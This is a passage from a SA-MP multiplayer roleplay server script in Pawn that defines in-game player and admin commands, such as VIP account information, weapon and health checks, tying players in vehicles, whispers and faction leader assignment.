	timereferral[playerid] = 120;
	return 1;
}
CMD:vip(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new viptext[256];
	if(PlayerInfo[playerid][pVip] == 0) viptext = "{0066FF}Standard{FFFFFF}";
	else if(PlayerInfo[playerid][pVip] == 1) viptext = "{F97804}VIP{FFFFFF}";
	format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}%s - Account Status: %s\n\n{FFFFFF}A) Account {F97804}VIP{FFFFFF}\n\n{F97804}1.{FFFFFF}VIP Account offers various advantages that are mentioned in Section B.\n\
	{F97804}2.{FFFFFF}Account registration is Standard (Limited), more about expanding your account in one VIP find the point C.",PlayerInfo[playerid][pNormalName], viptext);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n\nB) Benefits Account {F97804}VIP{FFFFFF}\n\n{F97804}1.{FFFFFF}Having a VIP Account offers a maximum interest on bank ($150,000 with C.P, and without C.P $120,000) every payday.\n\
	{F97804}2.{FFFFFF}Having a VIP account you give an hour played every payday, no matter if you play a few seconds of that time.",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n{F97804}3.{FFFFFF}Having a VIP Account offers once at 5:00 played on server continues a bonus, it consists of 3-10 points Respect.\n\
	{F97804}4.{FFFFFF}Having a VIP account allows you to hold clothes closet unlimited personal.",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n{F97804}5.{FFFFFF}Having a VIP account allows you to hold 15 passenger cars and two houses.",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n{F97804}7.{FFFFFF}Having a VIP Account offers several new orders, they are:\n\t/vc - vip chat\n\t/vr - vip repair (vehicle repair)\n\t/vf - vip flip (recovers vehicle)\n\t/vnos - N20 installed on vehicle\n\t/togvc - vip chat off.",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n{F97804}8.{FFFFFF}Having a VIP account allows you Remember, tastatii order [/viplogin] for further information.",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n\nC) Account extension {0066FF}Standard{FFFFFF} In One {F97804}VIP{FFFFFF}\n\n\
	{F97804}1.{FFFFFF}Your account may be extended in one VIP by buying it with real money.\n\
	\t{F97804}a) {FFFFFF}Go to a point where PaySafeCarduri sell, and buy one of 25 lei.\n\
	\t{F97804}b) {FFFFFF}After purchasing paysafecard, contact your {0066FF}MorTezA.{FFFFFF} server or a forum PM.",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n\t{F97804}c) {FFFFFF}When you come face to face with {0066FF}MorTezA.{FFFFFF} operations with it to complete payment.\n\
	{F97804}2.{FFFFFF}When payment is completed successfully, you will receive VIP account.\n\t{F97804}Observation: {FFFFFF}PaySafeCardurile commonly found in Post /PayPoint.",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n{F97804}3.{FFFFFF}Conform termeniilor de utilizare, daca oferiti un cod fals, folosit, veti fi sanctionati cu Ban permanent pe IP.\n\t{F97804}Observation: {FFFFFF}Do not make payment to other administrators.",MGLOBAL);
	ShowPlayerDialog(playerid, DIALOG_VIP, DIALOG_STYLE_MSGBOX, "Informatii - Cont VIP", MGLOBAL, "OK", "");
	return 1;
}
// STOCK VIP
stock MVIP(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(gPlayerLogged[i] > 0)
			{
				if(PlayerInfo[i][pVip] > 0 && vipchat[i] > 0)
				{
					SCM(i, color, string);
				}
			}	
		}
	}
	return 1;
}
//
CMD:setppo(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
        if (PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
        new id[25],cont,premiump;
        if(sscanf(params, "s[25]i",id,premiump)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/setppo <Name> <Premium Points>");
        cont = MySQLCheckAccount(id);
        if(cont == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This name does not exist.");
		new str1[128];
		mysql_format(SQL,str1,sizeof(str1),"UPDATE users SET `PremiumPoints`='%d' WHERE `name`='%s'",premiump,id);
		mysql_tquery(SQL,str1,"","");
	}
	return 1;
}
CMD:oldcar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new string[64];
	    format(string, sizeof(string), "Your old car was: %d",gLastCar[playerid]);
	    SendClientMessage(playerid, COLOR_GREY, string);
    }
    return 1;
}
CMD:mutetime(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pMuteTime] > 0)
		{
			new string[64];
	        format(string, sizeof(string), "{C20505}Your mute time left: %d.", PlayerInfo[playerid][pMuteTime]);
		    SendClientMessage(playerid,COLOR_SERVER, string);
		}
        else
        {
			SendClientMessage(playerid, COLOR_SERVER, "{C20505}You don't have mute.");
			return 1;
		}
	}
	return 1;
}
CMD:checkgun(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			new id,string[128],sendername[25];
			if(sscanf(params, "u",id)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/checkgun <Name/Playerid>");
            new Player_Weapons[13];
            new Player_Ammos[13];
            new i;
			if(IsPlayerConnected(id))
			{
                for(i = 1;i <= 12;i++)
                {
                    GetPlayerWeaponData(id,i,Player_Weapons[i],Player_Ammos[i]);
                    if(Player_Weapons[i] != 0)
                    {
                        new weaponName[256];
                        GetPlayerName(id, sendername, sizeof(sendername));
                        GetWeaponName(Player_Weapons[i],weaponName,255);
                        format(string,255,"{B8DBFF}* %s , Gun:{FFFFFF} %s {B8DBFF}, Ammo:{FFFFFF} %d",sendername,weaponName,Player_Ammos[i]);
                        SendClientMessage(playerid,0xFFFFFFAA,string);
                    }
				}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:checkhp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 1)
		{
			new id,giveplayer[25],string[128];
			if(sscanf(params, "u",id)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/checkhp <Name/Playerid>");
			if(IsPlayerConnected(id))
			{
					new Float:health;
		            new Float:armour;
		            GetPlayerHealthEx(id, health);
		            GetPlayerArmourEx(id, armour);
	                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                    format(string,255,"{B8DBFF}* %s ,{B8DBFF} HP:{FFFFFF} %.2f ,{B8DBFF} Armour:{FFFFFF} %.2f",giveplayer,health,armour);
	                SendClientMessage(playerid,0xFFFFFFAA,string);
	                return 1;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:eject(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
        new State;
        if(IsPlayerInAnyVehicle(playerid))
        {
			new id,string[128],giveplayer[25];
		 	State=GetPlayerState(playerid);
	        if(State!=PLAYER_STATE_DRIVER) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}You can only eject people as the driver.");
			if(sscanf(params, "u",id)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/eject <Name/Playerid>");
			new test;
			test = GetPlayerVehicleID(playerid);
			if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					if(PlayerTied[id] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player have tie.");
			        if(id == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You cannot eject yourself.");
			        if(IsPlayerInVehicle(id,test))
			        {
						new PName[MAX_PLAYER_NAME];
						GetPlayerName(playerid,PName,sizeof(PName));
						GetPlayerName(id, giveplayer, sizeof(giveplayer));
						format(string, sizeof(string), "* You have thrown %s out of the car!", giveplayer);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* You have been thrown out the car by %s !", PName);
						SendClientMessage(id, COLOR_LIGHTBLUE, string);
						RemovePlayerFromVehicleEx(id);
						return 1;
					}
					else
					{
					    SendClientMessage(playerid, COLOR_SERVER, "{FFB870}That player is not in your car.");
					    return 1;
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in a vehicle to use this.");
		}
	}
	return 1;
}
CMD:tie(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(IsAMember(playerid))
		{
		    if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need rank 2 or higher to tie people up.");
		    new id,string[128],sendername[25],giveplayer[25];
			if(sscanf(params, "u",id)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/tie <Name/Playerid>");
		    if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
				    if(PlayerTied[id] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player already tied.");
					if (ProxDetectorS(8.0, playerid, id))
					{
					    new car = GetPlayerVehicleID(playerid);
					    if(id == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You cannot tie yourself.");
					    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && IsPlayerInVehicle(id, car))
					    {
					        GetPlayerName(id, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
					        format(string, sizeof(string), "* You were tied up by %s, till untie.", sendername);
							SendClientMessage(id, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* You tied %s up, till untie.", giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* %s ties %s up, so he wont go anywhere.", sendername ,giveplayer);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							TogglePlayerControllable(id, 0);
							PlayerTied[id] = 1;
					    }
					    else
					    {
					        SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player not in your car, or your not the driver.");
					        return 1;
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_SERVER, "{C1F589}No player near you.");
					    return 1;
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			    return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Family/Gang Member.");
		}
	}
	return 1;
}
CMD:untie(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(IsAMember(playerid) || IsACop(playerid))
		{
		    if(PlayerInfo[playerid][pRank] < 3 && IsAMember(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need rank 2 or higher to untie people.");
			new id,string[128],giveplayer[25],sendername[25];
			if(sscanf(params, "u",id)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/untie <Name/Playerid>");
			if(IsPlayerConnected(id))
			{
				if(id != INVALID_PLAYER_ID)
				{
				    if (ProxDetectorS(8.0, playerid, id))
					{
					    if(id == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You cannot untie yourself!");
						if(PlayerTied[id])
						{
						    GetPlayerName(id, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
						    format(string, sizeof(string), "* You were Untied by %s.", sendername);
							SendClientMessage(id, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* You Untied %s.", giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							TogglePlayerControllable(id, 1);
							PlayerTied[id] = 0;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_SERVER, "{FFB870}That player isn't tied up.");
						    return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_SERVER, "{C1F589}No player near you.");
					    return 1;
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "{C1F589}Error: Player not connected.");
			    return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Family/Gang Member or Cop.");
		}
	}
	return 1;
}
CMD:cc(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 2)
		{
			foreach(Player,id)
			{
				if(PlayerInfo[id][pAdmin] == 0 && PlayerInfo[id][pHelper] == 0)
				{
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
					SendClientMessage(id, COLOR_SYSTEM, " ");
				}
			}
			new sendername[25],string[100];
			GetPlayerName(playerid,sendername,sizeof(sendername));
			format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}%s used /cc.",sendername);
			ABroadCast(COLOR_AdminWarn,string,1);
			return 1;
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:buygun(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pGunLic] == 0) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You don't have gun license.");
    if(GetPlayerInterior(playerid) == 7)
    {
		if(GetPlayerInterior(playerid) == 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in a store.");
	 	ShowPlayerDialog(playerid,Dialog_gunshop,DIALOG_STYLE_LIST,"Select:","Baseball bat($1,000)\nSD Pistol($2,000)\nDesert eagle($3,000)\nShotgun($4,200)\nMP5($4,600)\nAK47($7,000)\nM4($7,000)","Select","Cancel");
	    return 1;
    }
    else
	{
		SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in a Gun shop.");
	}
    return 1;
}
CMD:wisper(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new string[128],id,mess[250],giveplayer[25],sendername[25];
        if(PlayerInfo[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You must be level 2 to use /w(isper).");
        if(PlayerInfo[playerid][pMuted] == 1)
        {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		if(sscanf(params, "us[250]",id,mess)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/w <Name/Playerid> <Message>");
		if (IsPlayerConnected(id))
		{
		    if(id != INVALID_PLAYER_ID)
		    {
				if(GetDistanceBetweenPlayers(playerid,id) > 5) return SCM(playerid,COLOR_SERVER,"{C1F589}This player is not near you.");
				if(Spectate[id] != -1) return SCM(playerid,COLOR_SERVER,"{C1F589}This player is not near you.");
			    if(HidePM[id] > 0) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}This player doesn't allow whispers.");
				if(id == playerid) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You can not send a message to yourself.");
				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				format(string, sizeof(string), "{FFEA00}%s whispers: %s", sendername, mess);
				SendClientMessage(id, COLOR_YELLOW, string);
				format(string, sizeof(string), "{FFEA00}Whisper to %s: %s", giveplayer, mess);
				SendClientMessage(playerid,  COLOR_YELLOW, string);
				new strr[300];
				format(strr, sizeof(strr),"(whisper) %s",mess);
				if(FindIP(mess))
			    {
					format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /w.", sendername,playerid,mess);
					ABroadCast(COLOR_SERVER,string,1);
			    }
			    for(new d; d<sizeof(TLD); d++)
				{
				    if(strfind(mess,TLD[d],true) != -1 )
				    {
						if(strfind(mess, "wwww.Magic-Gaming.tk", true) != -1 || strfind(mess, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(mess, "Magic-Gaming.tk", true) != -1) break;
						format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /w.", sendername,playerid,mess);
						ABroadCast(COLOR_SERVER,string,1);
					}
				}
				for(new adm = 0; adm<=MAX_PLAYERS;adm++)
				{
    				if(IsPlayerConnected(adm))
					{
	    				if(PlayerInfo[adm][pAdmin] > 0 && BigEar[adm] == 1)
    	    			{
   	        				format(string, sizeof(string), "{FFEA00}Whisper: (%d) %s to (%d) %s: %s",playerid,sendername,id,giveplayer,mess);
							SendClientMessage(adm,  COLOR_YELLOW, string);
  	    				}
					}
				}
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	return 1;
}
CMD:w(playerid, params[])
{
	return cmd_wisper(playerid, params);
}
CMD:makeleader(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 5)
		{
			new para1,level,string[256],giveplayer[25],sendername[25],escape[256];
	     	if(sscanf(params, "ui",para1,level))
	    	{
		     	SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Bezan: {FFFFFF}/makeleader <Name/Playerid> <Number(1-12)>");
				SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}(1) EdarePolice (2) PoliceFederal (3) GardMeli (4) Los Aztecas");
				SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}(5) Yakuza (6) Los Vagos (8) LVPD");
				SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}(9) KhabarNegar (10) Ballas (11) Hitman Agency (12) EdareAmuzesh");
				SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}(13) Ajans (14) Pezeshk (15) SFPD");
				return 1;
			}
			if(level > 15 || level < 0) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}Adad Beyne 1 Va 14 Bashe!");
			if(level == 7) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}Aceasta factiune nu mai exista.");
		    if(IsPlayerConnected(para1))
		    {
		        if(para1 != INVALID_PLAYER_ID)
		        {
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					new ftext[50],query[256];
					if(level == 1) { ftext = "Edare Police"; } //Police Force
					else if(level == 2) { ftext = "Police Federal"; } //FBI
					else if(level == 3) { ftext = "Gard Meli"; } //National Guard
					else if(level == 4) { ftext = "Los Aztecas"; } //Los Aztecas
					else if(level == 5) { ftext = "Yakuza Family"; } //Grove Street
					else if(level == 6) { ftext = "Los Vagos"; } //Los Vagos
					else if(level == 8) { ftext = "LVPD"; } //LVPD
					else if(level == 9) { ftext = "Khabar Negar"; } //News Reporter
					else if(level == 10) { ftext = "Ballas"; } //Ballas
                    else if(level == 11) { ftext = "Hitman"; } //The Agency
                    else if(level == 12) { ftext = "Edare Amuzesh"; } //School Instructors
                    else if(level == 13) { ftext = "Los Santos Taxi"; } //Los Santos Taxi
                    else if(level == 14) { ftext = "Pezeshk"; } //Paramedic
                    else if(level == 15) { ftext = "SFPD"; } //SFPD
					PlayerInfo[para1][pMember] = level;
					PlayerInfo[para1][pLeader] = level;
					format(string, sizeof(string), "Admin %s Shomaro Leader %s Kard.", sendername,ftext);
					SendClientMessage(para1, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "<< Admin %s Karbar %s Ro Leader %s Kard >>",sendername,giveplayer,ftext);
					ABroadCast(COLOR_RED2,string,1);
					format(string, sizeof(string), "%s Ham Akunun Leader %s.", giveplayer, ftext);
					mysql_real_escape_string(string, escape);
					mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`, `player`,`leader`) VALUES ('%s','%d','%d')", escape, PlayerInfo[para1][pSQLID],PlayerInfo[playerid][pSQLID]);
					mysql_tquery(SQL,query,"","");
					mysql_format(SQL, query, sizeof(query), "INSERT INTO staff_logs (`text`) VALUES ('%s')", escape);
					mysql_tquery(SQL,query,"","");
					if(level == 0) { PlayerInfo[para1][pModel] = 0; }
					else if(level == 1) { PlayerInfo[para1][pModel] = 304; } //Police Force
					else if(level == 2) { PlayerInfo[para1][pModel] = 286; } //FBI
					else if(level == 3) { PlayerInfo[para1][pModel] = 273; } //National Guard
					else if(level == 4) { PlayerInfo[para1][pModel] = 113; } //Los Aztecas
					else if(level == 5) { PlayerInfo[para1][pModel] = 270; } //Grove Street
					else if(level == 6) { PlayerInfo[para1][pModel] = 109; } //Los Vagos
					else if(level == 8) { PlayerInfo[para1][pModel] = 304; } //LVPD
